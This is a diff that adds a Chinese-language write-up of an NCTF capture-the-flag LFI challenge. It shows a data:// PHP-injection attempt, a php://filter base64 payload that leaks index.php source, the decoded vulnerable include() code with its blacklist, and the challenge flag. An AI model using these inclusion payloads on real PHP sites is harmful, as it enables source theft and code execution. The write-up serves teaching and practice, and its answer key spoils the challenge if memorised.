@@ -94,6 +94,49 @@ tags: NCTF Write-up Web
 <hr>
 
 ### 150 文件包含  
+* 题目:  
+![](http://r.photo.store.qq.com/psb?/V11aPCg53lyBwf/tIHjsm6TX.J6ADSq701wt770uWEjWxbA3IpLKPVB504!/r/dK0AAAAAAAAA){: width="80%"}  
+
+	> 没错 这就是传说中的LFI  
+	> 传送门[点我带你飞](http://4.chinalover.sinaapp.com/web7/index.php)  
+	>   
+	> TIPS:[http://drops.wooyun.org/tips/3827](http://drops.wooyun.org/tips/3827)  
+
+* 题解:   
+	题目是文件包含, 而且是 LFI, 即本地文件包含, 那应该就不是远程包含一句话这类思路了, 先试试直接写 shell 呢?
+	[http://4.chinalover.sinaapp.com/web7/index.php?file=data:text/plain,<?php phpinfo();?>](http://4.chinalover.sinaapp.com/web7/index.php?file=data:text/plain,<?php phpinfo();?>)  
+	结果是:  
+
+	> Oh no!  
+
+	嗯...试试读源码, php 有个特殊协议(其实我也不会php, 提示给的乌云drops很好, 但是乌云已经...:(, php://filter 用于数据流打开时的筛选过滤应用, 如果通过它读取 php 文件并编码成不能正常运行的形式, 就可以得到编码后的源码了, 试试?
+	[http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/read=convert.base64-encode/resource=index.php](http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/read=convert.base64-encode/resource=index.php)
+	结果是:  
+
+	> PGh0bWw+CiAgICA8dGl0bGU+YXNkZjwvdGl0bGU+CiAgICAKPD9waHAKCWVycm9yX3JlcG9ydGluZygwKTsKCWlmKCEkX0dFVFtmaWxlXSl7ZWNobyAnPGEgaHJlZj0iLi9pbmRleC5waHA/ZmlsZT1zaG93LnBocCI+Y2xpY2sgbWU/IG5vPC9hPic7fQoJJGZpbGU9JF9HRVRbJ2ZpbGUnXTsKCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpewoJCWVjaG8gIk9oIG5vISI7CgkJZXhpdCgpOwoJfQoJaW5jbHVkZSgkZmlsZSk7IAovL2ZsYWc6bmN0ZntlZHVsY25pX2VsaWZfbGFjb2xfc2lfc2lodH0KCj8+CjwvaHRtbD4=  
+
+	base64 解码后:
+
+	> ```  
+	> <html>  
+	> <title>asdf</title>  
+    >  
+	> <?php  
+	> error_reporting(0);  
+	> if(!$_GET[file]){echo '<a href="./index.php?file=show.php">click me? no</a>';}  
+	> $file=$_GET['file'];  
+	> if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){  
+	>     echo "Oh no!";  
+	> exit();  
+	> }  
+	> include($file);   
+	> //flag:nctf{edulcni_elif_lacol_si_siht}  
+	> 
+	> ?>  
+	> </html>  
+	> ```  
+
+* flag：nctf{edulcni_elif_lacol_si_siht}
 <hr>
 
 <div style="display:inline;float:left">  
